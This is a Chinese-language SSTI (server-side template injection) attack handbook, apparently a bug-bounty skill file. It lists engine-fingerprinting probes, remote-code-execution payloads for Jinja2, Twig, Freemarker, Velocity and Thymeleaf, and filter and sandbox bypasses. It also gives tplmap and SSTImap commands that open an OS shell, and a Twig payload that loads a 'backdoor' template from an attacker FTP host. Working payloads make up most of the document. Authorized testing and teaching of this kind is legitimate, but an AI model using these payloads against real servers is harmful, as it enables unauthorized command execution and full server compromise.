---
name: ssti
description: CWE: CWE-1336 | OWASP: WSTG-INPV-18 / A03:2021 核心: 用户输入被当作模板表达式执行, 大部分引擎可达 RCE。 回报: 高-严重, $1000-$15000+
category: vuln
tags: [server]
---

# SSTI (Server-Side Template Injection) 深度手册

> **CWE**: CWE-1336 | **OWASP**: WSTG-INPV-18 / A03:2021
> **核心**: 用户输入被当作模板表达式执行, 大部分引擎可达 RCE。
> **回报**: 高-严重, $1000-$15000+

---

## 0. First-pass Payload Set

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{7*'7'}}
${{7*7}}
#{ 7 * 7 }
{{7*7}}-{{2*2}}         # 双表达式确认
*{7*7}
${7*'7'}
```

观察响应:
- `49` → Jinja2 / Twig / ...
- `7777777` → Jinja2 / Tornado (字符串重复 7 次)
- `49` 但 `{{7*'7'}}` 返回 `49` → Twig

---

## 1. 引擎识别矩阵

| Payload | 引擎 | 语言 |
|---------|------|------|
| `{{7*7}}` → 49 | Jinja2 / Twig / Nunjucks / Liquid | Python/PHP/JS/Ruby |
| `{{7*'7'}}` → 7777777 | Jinja2 / Nunjucks | Python/JS |
| `{{7*'7'}}` → 49 | Twig | PHP |
| `${7*7}` → 49 | Freemarker / Velocity / Thymeleaf | Java |
| `<%= 7*7 %>` → 49 | ERB | Ruby |
| `<%= 7*7 %>` → 49 | EJS | Node.js |
| `#{7*7}` → 49 | Pug(Jade) / Thymeleaf(可选) | JS / Java |
| `*{7*7}` → 49 | Thymeleaf | Java |
| `${{7*7}}` → 49 | Handlebars (配合其它语法) | JS |
| `{{= 7*7 }}` → 49 | Plates / Doctrine | PHP |
| `@(7*7)` → 49 | Razor | .NET |
| `{7*7}` → 49 | Smarty (若不开 security) | PHP |
| `[[${7*7}]]` → 49 | Thymeleaf inline | Java |
| `[[7*7]]` → 49 | Dotcms Velocity | Java |

---

## 2. Jinja2 (Python / Flask / Django)

### 2.1 探测
```
{{ config }}
{{ request }}
{{ self }}
{{ ''.__class__ }}
{{ ().__class__.__bases__[0].__subclasses__() }}
```

### 2.2 RCE Payload

#### 经典 __subclasses__ (Python 2/3 都有)

```python
{{ ''.__class__.__mro__[2].__subclasses__() }}
# 找到下标为 N 的 <class 'subprocess.Popen'> 等可执行类

{{ ''.__class__.__mro__[2].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
```

#### 通过 os 模块 (推荐, 最可靠)

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ cycler.__init__.__globals__.os.popen('id').read() }}

{{ joiner.__init__.__globals__.os.popen('id').read() }}

{{ namespace.__init__.__globals__.os.popen('id').read() }}

{{ lipsum.__globals__.os.popen('id').read() }}        # 最短
```

#### 通过 config (Flask 特有, 无过滤时最短)

```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

#### 通过 url_for / get_flashed_messages (Flask)

```python
{{ url_for.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

#### 过滤绕过: `{{` 被禁

```
{% print(config) %}
{% if lipsum.__globals__['os'].popen('id').read() %}1{% endif %}
```

#### 过滤绕过: `.` 被禁

```python
{{ request['application']['__self__']['__class__']['__mro__'][8]['__subclasses__']() }}

# 或用 attr 过滤器
{{ request|attr('application')|attr('\x5f\x5fself\x5f\x5f')|attr('\x5f\x5fclass\x5f\x5f') }}
```

#### 过滤绕过: `_` 被禁

```python
{{ ""[request.args.a][request.args.b] }}&a=__class__&b=__mro__
```

---

## 3. Twig (PHP / Symfony)

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{{ ['id']|filter('system') }}

{{ {}.__get_parent() }}     # 探测

{{ _self.env.setCache("ftp://attacker:asdf@127.0.0.1:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

### 3.1 Twig (新版) 沙箱逃逸

较新版本 Twig 有 sandbox, 但可绕过:
```
{{ ['id']|map('system')|join(',')}}
```

---

## 4. Freemarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["id"]).start()}

# 新版 Freemarker 默认禁 Execute
# 绕过:
${'freemarker.template.utility.Execute'?new()('id')}

# Groovy
<#assign ex="groovy.lang.GroovyShell"?new()>${ex.evaluate("Runtime.getRuntime().exec('id')")}
```

---

## 5. Velocity (Java)

```
#set($x="")
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($chr=$x.class.forName("java.lang.Character"))
#set($str=$x.class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

---

## 6. Thymeleaf (Spring)

```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

*{T(java.lang.Runtime).getRuntime().exec("id")}

[[${T(java.lang.Runtime).getRuntime().exec('calc')}]]
```

Thymeleaf SpringEL 注入(极为常见):
```
#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

---

## 7. 次主流引擎 / 冷门引擎 → SCENARIOS

> ERB / EJS / Pug / Handlebars / Razor / Smarty / Liquid / Mako 的 payload, 以及 Angular / Vue / Doctrine / Plates / Tornado / EEx 等冷门引擎, 全部移到 **[ssti-scenarios.md](ssti-scenarios.md)** §1-§9。
>
> 本主文件只保留 5 大主流引擎(Jinja2 / Twig / Freemarker / Velocity / Thymeleaf, 覆盖 Python / PHP / Java 主流服务端)。

---

## 8. 工具

```bash
# tplmap (经典)
python3 tplmap.py -u "http://target.com/?name=test" --os-shell

# SSTImap (更新)
python3 sstimap.py -u "http://target.com/?name=test" --os-shell
```

---

## 9. Blind SSTI → SCENARIOS

> 无回显场景(时间盲 / OOB 外带) 移到 **[ssti-scenarios.md](ssti-scenarios.md)** §10。

---

## 10. 典型漏洞场景

### 10.1 邮件模板

管理员配置邮件模板: "Hello {{user.name}}". 若 `user.name` 可含模板表达式, 触发 SSTI。

### 10.2 错误页/自定义页面

404/500 自定义页面常用模板: `您访问的 {{request.path}} 不存在`。

### 10.3 报告/导出

PDF 报告用 Jinja2 模板, 参数由用户填。

### 10.4 消息通知

发通知时: `{{user.nickname}} 关注了你`。nickname 可控。

### 10.5 Webhook / API 响应模板

```
# 后端: template.render(custom_format, **data)
custom_format = user_input
```

---

## 11. Testing Checklist

- [ ] 所有模板/渲染类输入都测
- [ ] 基础探测: `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` 全部
- [ ] 识别引擎指纹
- [ ] 按引擎选对应 RCE payload
- [ ] 过滤绕过(点/下划线/关键字)
- [ ] 盲 SSTI: 时间 + OOB
- [ ] 邮件/报告/通知模板是常漏点
- [ ] 前端 SSTI (AngularJS / Vue) 也是注入 XSS 的通道
- [ ] 沙箱逃逸: Twig / Smarty / Handlebars 新版

---

## 12. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| `{{7*7}}` 原样反射 | 不一定是 SSTI, 可能只是 HTML 反射, 考虑 XSS 方向 |
| `{{7*7}}` 返回 `49` 但无 RCE | 可能是沙箱版, 尝试该引擎的沙箱逃逸 |
| 前端 Angular 的 `{{...}}` | 客户端模板, 不是 SSTI; 是 XSS(client-side template injection) |
| `${7*7}` 返回 49 | 可能是 bash 变量不是 SSTI, 确认是模板引擎 |
| 返回 HTML error | 看 stack trace 锁定引擎 |

---

## 13. 影响证明

**低**: `{{7*7}}` 返回 49。

**中**: 读取 config / env / 环境变量。

**高**: 执行 `id` / 读取敏感文件。

**严重**: RCE + 服务器完全控制证明。

---

## 14. 相关参考

| 内容 | 文件 |
|------|------|
| **次主流引擎(ERB/EJS/Pug/Handlebars/Razor/Smarty/Liquid/Mako) / 冷门引擎 / Blind SSTI** | [ssti-scenarios.md](ssti-scenarios.md) |
| XSS(客户端模板注入) | [xss.md](xss.md) |
| 命令注入(相似 RCE) | [cmdi.md](cmdi.md) |
| 反序列化 | [deserialize.md](deserialize.md) |
| WAF 绕过 | [../waf-bypass.md](../waf-bypass.md) |

---

**CWE**: CWE-1336 | **WSTG**: INPV-18 | **CVSS 典型**: 9.8 (未授权 RCE) / 8.1 (有认证 RCE)
